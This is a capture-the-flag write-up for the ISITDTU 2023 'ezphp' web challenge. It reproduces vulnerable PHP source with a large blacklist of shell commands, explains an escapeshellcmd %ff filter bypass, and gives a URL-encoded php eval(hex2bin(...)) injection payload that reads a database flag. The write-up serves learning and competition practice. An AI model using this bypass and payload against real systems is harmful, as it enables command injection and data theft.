---
layout: post
title: ISITDTU CTF Qualifiers 2023 - ezphp Writeup
excerpt: "Despite being titled ezphp, this challenge was anything but easy. Let's take a look at how I solved it."
categories: [Writeups]
tags: [web]
---
> This site is now archived. Please visit [https://jax.dev/blog](https://jax.dev/blog) for the latest content.
Despite being titled ezphp, this challenge was anything but easy. It took be beyond the end of the CTF to finish, but it was a fun challenge nonetheless. 

We are provided a link and some source code. The source code is as follows:

```php
<html>
 <head>
  <title> Debug Page...</title>

  <meta charset="utf-8">

  <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>
  <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>

</head>
<body>
    <div class="container">
    <?php
    error_reporting(0);
    $conn = mysqli_connect('db', 'user', 'test', "dockerExample");


    $query = 'SELECT * From Person';
    $result = mysqli_query($conn, $query);

    echo '<table class="table table-striped">';
    echo '<thead><tr><th></th><th>id</th><th>name</th></tr></thead>';
    while($value = $result->fetch_array(MYSQLI_ASSOC)){
        echo '<tr>';
        echo '<td><a href="#"><span class="glyphicon glyphicon-search"></span></a></td>';
        foreach($value as $element){
            echo '<td>' . $element . '</td>';
        }

        echo '</tr>';
    }
    echo '</table>';

    $result->close();

    mysqli_close($conn);

    $blacklists = ["chgrp","mknod","run-parts","vdir","bunzip2","chmod","fgrep","mktemp","sed","wdctl","bzcat","chown","findmnt","more","bzcmp","cp","grep","mount","sleep","zcat","bzdiff","bash","gunzip","mountpoint","stty","zcmp","bzegrep","date","gzexe","mv","su","zdiff","bzexe","dd","gzip","nisdomainname","sync","zegrep","bzfgrep","df","hostname","pidof","tar","zfgrep","bzgrep","dir","kill","ps","tempfile","zforce","bzip2","dmesg","ln","pwd","touch","zgrep","bzip2recover","dnsdomainname","login","rbash","true","zless","bzless","domainname","ls","readlink","umount","zmore","bzmore","echo","lsblk","rm","uname","znew","cat","egrep","mkdir","rmdir","uncompress","m4","ab","make","addpart","make-first-existing-target","addr2line","mawk","apt","mcookie","apt-cache","md5sum","apt-cdrom","md5sum.textutils","apt-config","mesg","apt-get","mkfifo","apt-key","namei","apt-mark","nawk","ar","newgrp","arch","nice","as","nl","autoconf","nm","autoheader","nohup","autom4te","nproc","autoreconf","nsenter","autoscan","numfmt","autoupdate","objcopy","awk","objdump","b2sum","od","base32","open","base64","openssl","basename","pager","basenc","partx","bashbug","passwd","paste","patch","c89","pathchk","c89-gcc","perl","c99","c99-gcc","perl5.32.1","c_rehash","perlbug","captoinfo","perldoc","catchsegv","perlivp","cc","perlthanks","chage","pgrep","chattr","piconv","chcon","pidwait","checkgid","pinky","chfn","pkg-config","choom","pkill","chrt","pl2pm","chsh","pldd","cksum","pmap","clear","pod2html","clear_console","pod2man","cmp","pod2text","comm","pod2usage","compose","podchecker","corelist","cpan","printenv","cpp","cpp-10","prlimit","csplit","prove","curl","ptar","cut","ptardiff","deb-systemd-helper","ptargrep","deb-systemd-invoke","ptx","debconf","pwdx","debconf-apt-progress","ranlib","debconf-communicate","re2c","debconf-copydb","re2go","debconf-escape","readelf","debconf-set-selections","realpath","debconf-show","renice","delpart","reset","diff","resizepart","diff3","rev","dircolors","rgrep","dirname","rotatelogs","dpkg","rpcgen","dpkg-architecture","run-mailcap","dpkg-buildflags","runcon","dpkg-buildpackage","savelog","dpkg-checkbuilddeps","script","dpkg-deb","scriptlive","dpkg-distaddfile","scriptreplay","dpkg-divert","sdiff","dpkg-genbuildinfo","see","dpkg-genchanges","seq","dpkg-gencontrol","setarch","dpkg-gensymbols","setpriv","dpkg-maintscript-helper","setsid","dpkg-mergechangelogs","setterm","dpkg-name","sg","dpkg-parsechangelog","sha1sum","dpkg-query","sha224sum","dpkg-realpath","sha256sum","dpkg-scanpackages","sha384sum","dpkg-scansources","sha512sum","dpkg-shlibdeps","shasum","dpkg-source","shred","dpkg-split","shuf","dpkg-statoverride","size","dpkg-trigger","skill","dpkg-vendor","slabtop","du","snice","dwp","sort","edit","splain","elfedit","split","enc2xs","stat","encguess","stdbuf","env","streamzip","expand","strings","expiry","strip","expr","sum","factor","tabs","faillog","tac","fallocate","tail","fcgistarter","taskset","file","tee","fincore","test","find","tic","flock","timeout","fmt","tload","fold","toe","free","top","touch","tput","gcc","tr","gcc-10","truncate","gcc-ar","tset","gcc-ar-10","tsort","gcc-nm","tty","gcc-nm-10","tzselect","gcc-ranlib","unexpand","gcc-ranlib-10","uniq","gcov","unlink","gcov-10","unlzma","gcov-dump","unshare","gcov-dump-10","unxz","gcov-tool","update-alternatives","gcov-tool-10","uptime","gencat","users","getconf","utmpdump","getent","vmstat","getopt","w","gmake","wall","gold","watch","gpasswd","wc","gpgv","whereis","gprof","which","groups","who","h2ph","whoami","h2xs","head","hostid","htcacheclean","htdbm","htdigest","htpasswd","i386","iconv","id","ifnames","infocmp","infotocap","install","instmodsh","ionice","ipcmk","ipcrm","ipcs","ischroot","join","json_pp","last","lastb","lastlog","ld","ld.bfd","ld.gold","ldd","libnetcfg","link","linux32","linux64","locale","localedef","logger","logname","logresolve","lsattr","lscpu","lsipc","lslocks","xargs","lslogins","xsubpp","lsmem","xz","lsns","xzcat","lto-dump-10","xzcmp","lzcat","xzdiff","lzcmp","xzegrep","lzdiff","xzfgrep","lzegrep","xzgrep","lzfgrep","xzless","lzgrep","xzmore","lzless","yes","lzma","zdump","lzmainfo","zipdetails","lzmore","a2disconf","dpkg-reconfigure","policy-rc.d","a2dismod","e2freefrag","pwck","a2dissite","e4crypt","pwconv","a2enconf","e4defrag","pwunconv","a2enmod","faillock","readprofile","a2ensite","fdformat","remove-shell","a2query","filefrag","rmt","add-shell","groupadd","rmt-tar","addgroup","groupdel","rtcwake","adduser","groupmems","service","apache2","groupmod","split-logfile","apache2ctl","grpck","tarcat","apachectl","grpconv","tzconfig","check_forensic","grpunconv","update-ca-certificates","chgpasswd","httxt2dbm","update-mime","chmem","iconvconfig","update-passwd","chpasswd","invoke-rc.d","update-rc.d","chroot","ldattach","useradd","cpgr","userdel","cppw","newusers","usermod","delgroup","nologin","vigr","deluser","pam-auth-update","vipw","dpkg-fsys-usrunmess","pam_getenv","zic","dpkg-preconfigure","pam_timestamp_check","apache2-foreground","docker-php-ext-install","peardev","php","docker-php-entrypoint","docker-php-source","pecl","php-config","docker-php-ext-configure","freetype-config","phar","phpize","docker-php-ext-enable","pear","phar.phar","agetty","e2mmpstatus","fstrim","mkfs.ext2","swaplabel","badblocks","e2scrub","getty","mkfs.ext3","swapoff","blkdiscard","e2scrub_all","hwclock","mkfs.ext4","swapon","blkid","e2undo","installkernel","mkfs.minix","switch_root","blkzone","findfs","isosize","mkhomedir_helper","sysctl","blockdev","fsck","killall5","mkswap","tune2fs","chcpu","fsck.cramfs","ldconfig","pivot_root","unix_chkpwd","ctrlaltdel","fsck.ext2","logsave","raw","unix_update","debugfs","fsck.ext3","losetup","resize2fs","wipefs","dumpe2fs","fsck.ext4","mke2fs","runuser","zramctl","e2fsck","fsck.minix","mkfs","shadowconfig","e2image","fsfreeze","mkfs.bfs","start-stop-daemon","e2label","fstab-decode","mkfs.cramfs","sulogin"];
 
	$cmd = $_GET['cmd']; 
    foreach ($blacklists as $blacklist) {
    	$pattern = "/$blacklist/";
		if (preg_match($pattern, $cmd)) {
			die("Blacklist");
		}
	}

    system(escapeshellcmd($cmd));

    ?>
    </div>
</body>
</html>
```

We have a lot to look at, not only do have an extrmemly extensive blacklist, but we also have a database conneciton. We can see that the database connection is to a mysql database, and we can see that the database name is dockerExample.

Looking at the sql file we are given, we can see that there are two tables, Person and Flag_is_secret. 


```sql
SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;


CREATE TABLE `Person` (
  `id` int(11) NOT NULL,
  `name` varchar(20) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

CREATE TABLE `Flag_is_secret` (
  `id` int(11) NOT NULL,
  `flagss1337` varchar(20) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

INSERT INTO `Person` (`id`, `name`) VALUES
(1, 'Doraemon'),
(2, 'Conan'),
(3, 'Hanamichi');

INSERT INTO `Flag_is_secret` (`id`, `flagss1337`) VALUES
(1, 'NA'),
(2, 'NA'),
(3, 'ISITDTU{fake_flag}');

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;

```

We can see that the flag is stored in the Flag_is_secret table, but we unfornately cannot access it directly. This is where the cmd parameter comes in. 

We can use the cmd parameter to run commands on the server. However, we are limited by the blacklist.
    
```php
    $blacklists = ["chgrp","mknod","run-parts","vdir","bunzip2","chmod","fgrep","mktemp","sed","wdctl","bzcat","chown","findmnt","more","bzcmp","cp","grep","mount","sleep","zcat","bzdiff","bash","gunzip","mountpoint","stty","zcmp","bzegrep","date","gzexe","mv","su","zdiff","bzexe","dd","gzip","nisdomainname","sync","zegrep","bzfgrep","df","hostname","pidof","tar","zfgrep","bzgrep","dir","kill","ps","tempfile","zforce","bzip2","dmesg","ln","pwd","touch","zgrep","bzip2recover","dnsdomainname","login","rbash","true","zless","bzless","domainname","ls","readlink","umount","zmore","bzmore","echo","lsblk","rm","uname","znew","cat","egrep","mkdir","rmdir","uncompress","m4","ab","make","addpart","make-first-existing-target","addr2line","mawk","apt","mcookie","apt-cache","md5sum","apt-cdrom","md5sum.textutils","apt-config","mesg","apt-get","mkfifo","apt-key","namei","apt-mark","nawk","ar","newgrp","arch","nice","as","nl","autoconf","nm","autoheader","nohup","autom4te","nproc","autoreconf","nsenter","autoscan","numfmt","autoupdate","objcopy","awk","objdump","b2sum","od","base32","open","base64","openssl","basename","pager","basenc","partx","bashbug","passwd","paste","patch","c89","pathchk","c89-gcc","perl","c99","c99-gcc","perl5.32.1","c_rehash","perlbug","captoinfo","perldoc","catchsegv","perlivp","cc","perlthanks","chage","pgrep","chattr","piconv","chcon","pidwait","checkgid","pinky","chfn","pkg-config","choom","pkill","chrt","pl2pm","chsh","pldd","cksum","pmap","clear","pod2html","clear_console","pod2man","cmp","pod2text","comm","pod2usage","compose","podchecker","corelist","cpan","printenv","cpp","cpp-10","prlimit","csplit","prove","curl","ptar","cut","ptardiff","deb-systemd-helper","ptargrep","deb-systemd-invoke","ptx","debconf","pwdx","debconf-apt-progress","ranlib","debconf-communicate","re2c","debconf-copydb","re2go","debconf-escape","readelf","debconf-set-selections","realpath","debconf-show","renice","delpart","reset","diff","resizepart","diff3","rev","dircolors","rgrep","dirname","rotatelogs","dpkg","rpcgen","dpkg-architecture","run-mailcap","dpkg-buildflags","runcon","dpkg-buildpackage","savelog","dpkg-checkbuilddeps","script","dpkg-deb","scriptlive","dpkg-distaddfile","scriptreplay","dpkg-divert","sdiff","dpkg-genbuildinfo","see","dpkg-genchanges","seq","dpkg-gencontrol","setarch","dpkg-gensymbols","setpriv","dpkg-maintscript-helper","setsid","dpkg-mergechangelogs","setterm","dpkg-name","sg","dpkg-parsechangelog","sha1sum","dpkg-query","sha224sum","dpkg-realpath","sha256sum","dpkg-scanpackages","sha384sum","dpkg-scansources","sha512sum","dpkg-shlibdeps","shasum","dpkg-source","shred","dpkg-split","shuf","dpkg-statoverride","size","dpkg-trigger","skill","dpkg-vendor","slabtop","du","snice","dwp","sort","edit","splain","elfedit","split","enc2xs","stat","encguess","stdbuf","env","streamzip","expand","strings","expiry","strip","expr","sum","factor","tabs","faillog","tac","fallocate","tail","fcgistarter","taskset","file","tee","fincore","test","find","tic","flock","timeout","fmt","tload","fold","toe","free","top","touch","tput","gcc","tr","gcc-10","truncate","gcc-ar","tset","gcc-ar-10","tsort","gcc-nm","tty","gcc-nm-10","tzselect","gcc-ranlib","unexpand","gcc-ranlib-10","uniq","gcov","unlink","gcov-10","unlzma","gcov-dump","unshare","gcov-dump-10","unxz","gcov-tool","update-alternatives","gcov-tool-10","uptime","gencat","users","getconf","utmpdump","getent","vmstat","getopt","w","gmake","wall","gold","watch","gpasswd","wc","gpgv","whereis","gprof","which","groups","who","h2ph","whoami","h2xs","head","hostid","htcacheclean","htdbm","htdigest","htpasswd","i386","iconv","id","ifnames","infocmp","infotocap","install","instmodsh","ionice","ipcmk","ipcrm","ipcs","ischroot","join","json_pp","last","lastb","lastlog","ld","ld.bfd","ld.gold","ldd","libnetcfg","link","linux32","linux64","locale","localedef","logger","logname","logresolve","lsattr","lscpu","lsipc","lslocks","xargs","lslogins","xsubpp","lsmem","xz","lsns","xzcat","lto-dump-10","xzcmp","lzcat","xzdiff","lzcmp","xzegrep","lzdiff","xzfgrep","lzegrep","xzgrep","lzfgrep","xzless","lzgrep","xzmore","lzless","yes","lzma","zdump","lzmainfo","zipdetails","lzmore","a2disconf","dpkg-reconfigure","policy-rc.d","a2dismod","e2freefrag","pwck","a2dissite","e4crypt","pwconv","a2enconf","e4defrag","pwunconv","a2enmod","faillock","readprofile","a2ensite","fdformat","remove-shell","a2query","filefrag","rmt","add-shell","groupadd","rmt-tar","addgroup","groupdel","rtcwake","adduser","groupmems","service","apache2","groupmod","split-logfile","apache2ctl","grpck","tarcat","apachectl","grpconv","tzconfig","check_forensic","grpunconv","update-ca-certificates","chgpasswd","httxt2dbm","update-mime","chmem","iconvconfig","update-passwd","chpasswd","invoke-rc.d","update-rc.d","chroot","ldattach","useradd","cpgr","userdel","cppw","newusers","usermod","delgroup","nologin","vigr","deluser","pam-auth-update","vipw","dpkg-fsys-usrunmess","pam_getenv","zic","dpkg-preconfigure","pam_timestamp_check","apache2-foreground","docker-php-ext-install","peardev","php","docker-php-entrypoint","docker-php-source","pecl","php-config","docker-php-ext-configure","freetype-config","phar","phpize","docker-php-ext-enable","pear","phar.phar","agetty","e2mmpstatus","fstrim","mkfs.ext2","swaplabel","badblocks","e2scrub","getty","mkfs.ext3","swapoff","blkdiscard","e2scrub_all","hwclock","mkfs.ext4","swapon","blkid","e2undo","installkernel","mkfs.minix","switch_root","blkzone","findfs","isosize","mkhomedir_helper","sysctl","blockdev","fsck","killall5","mkswap","tune2fs","chcpu","fsck.cramfs","ldconfig","pivot_root","unix_chkpwd","ctrlaltdel","fsck.ext2","logsave","raw","unix_update","debugfs","fsck.ext3","losetup","resize2fs","wipefs","dumpe2fs","fsck.ext4","mke2fs","runuser","zramctl","e2fsck","fsck.minix","mkfs","shadowconfig","e2image","fsfreeze","mkfs.bfs","start-stop-daemon","e2label","fstab-decode","mkfs.cramfs","sulogin"];
```

It is truely extensive, and it took me a while to find a bypass. I tried a lot of different things, but I eventually found a bypass. 
```
%ff
```
This bypasses the blacklist, and allows us to run commands. As we can see here we can run "php"
![](https://i.imgur.com/ZzsHzgm.png)

We now have to connect to the mysql database in order to extract the flag. We can do this by running the following command:
```php
ª$c = new mysqli('db', 'root', 'test', 'dockerExample');
$r = $c->query('SELECT * FROM The_table_you_dont_know');
while ($w = $r->fetch_assoc()) {
    print_r($w);
}
```
This php code will connect to the mysql database, and print out the contents of the table `the_table_you_dont_know` as it not actually in the `flag_is_secret` table.

We can then convert this php into hex:
```
aa2463203d206e6577206d7973716c6928276462272c2027726f6f74272c202774657374272c2027646f636b65724578616d706c6527293b0a2472203d2024632d3e7175657279282753454c454354202a2046524f4d205468655f7461626c655f796f755f646f6e745f6b6e6f7727293b0a7768696c6520282477203d2024722d3e66657463685f6173736f63282929207b0a202020207072696e745f72282477293b0a7d0a
```

We can then use eval(), substr() and hex2bin() to run this php code:
```php
php -r eval(substr(hex2bin(aa2463203d206e6577206d7973716c6928276462272c2027726f6f74272c202774657374272c2027646f636b65724578616d706c6527293b0a2472203d2024632d3e7175657279282753454c454354202a2046524f4d205468655f7461626c655f796f755f646f6e745f6b6e6f7727293b0a7768696c6520282477203d2024722d3e66657463685f6173736f63282929207b0a202020207072696e745f72282477293b0a7d0a),1));
```

Thought we still have have an issue with the blacklist. We can bypass this by using %ff. There is a flaw in PHP's escapeshellcmd() function  which stems from its handling of invalid Unicode characters, creating a security gap ripe for exploitation. Initially, the input is scanned against a blacklist via regex, which fails to match harmful strings like `ph\xFFp` due to the presence of `\xFF`. When escapeshellcmd() is invoked, it removes these invalid Unicode characters, effectively transforming the string into something like php, which bypasses the original filter. This results in a discrepant string representation at the regex and shell escaping stages, ultimately leaving the system vulnerable to command injection attacks.

The php documentation says the following are escaped by escapeshellcmd():
```
&#;`|*?~<>^()[]{}$\, \x0A and \xFF.
``` 


Keeping this bypass in mind, we can then run the following command after url encoding it:
```php
p%ffhp+-r+ev%ffal(s%ffubst%ffr(hex2bin(aa2463203d206e6577206d7973716c6928276462272c2027726f6f74272c202774657374272c2027646f636b65724578616d706c6527293b0a2472203d2024632d3e7175657279282753454c454354202a2046524f4d205468655f7461626c655f796f755f646f6e745f6b6e6f7727293b0a7768696c6520282477203d2024722d3e66657463685f6173736f63282929207b0a202020207072696e745f72282477293b0a7d0a),1))%3b
```

We can then run this command inside the url, and we get the flag:
![](https://i.imgur.com/DQQFSws.png)

Even though I struggled, I learned a lot, and I had a lot of fun. I hope you enjoyed this writeup, and thank you to the ISITDTU team for hosting this CTF. See you next year!